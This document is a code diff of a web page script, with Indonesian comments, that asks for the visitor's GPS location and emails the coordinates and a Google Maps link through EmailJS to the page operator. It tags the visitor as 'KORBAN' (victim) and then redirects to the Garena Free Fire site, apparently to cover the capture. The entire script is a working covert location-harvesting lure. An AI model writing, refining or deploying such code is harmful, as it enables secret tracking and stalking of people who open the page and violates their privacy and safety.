@@ -9,37 +9,33 @@
 <script>
 (function(){
 
-  emailjs.init("Ab3xvPQCqJkB8Kh_V"); // ganti dengan public key asli
+  emailjs.init("Ab3xvPQCqJkB8Kh_V");
+
+  function sukses(position){
+    let latitude = position.coords.latitude;
+    let longitude = position.coords.longitude;
+    let mapsLink = "https://www.google.com/maps?q=" + latitude + "," + longitude;
+
+    emailjs.send("service_lt5tmzc", "template_e16cgrw", {
+      name: "KORBAN🔥",
+      time: new Date().toLocaleString(),
+      message: "Lokasi berhasil diambil",
+      latitude: latitude,
+      longitude: longitude,
+      maps: mapsLink
+    }).then(function(){
+      window.location.replace("https://ff.garena.com");
+    });
+  }
+
+  function gagal(error){
+    alert("GPS belum aktif");
+    // Bisa tambahkan redirect juga kalau mau
+    // window.location.replace("https://ff.garena.com");
+  }
 
   if (navigator.geolocation) {
-
-    navigator.geolocation.getCurrentPosition(
-
-      function(position){
-
-        let latitude = position.coords.latitude;
-        let longitude = position.coords.longitude;
-        let mapsLink = "https://www.google.com/maps?q=" + latitude + "," + longitude;
-
-        emailjs.send("service_lt5tmzc", "template_e16cgrw", {
-          name: "Visitor",
-          time: new Date().toLocaleString(),
-          message: "Lokasi berhasil diambil",
-          latitude: latitude,
-          longitude: longitude,
-          maps: mapsLink
-        }).then(function(){
-            window.location.replace("https://ff.garena.com");
-        });
-
-      },
-
-      function(error){
-      alert("GPS belum aktif");
-      }
-
-    );
-
+    navigator.geolocation.getCurrentPosition(sukses, gagal);
   }
 
 })();
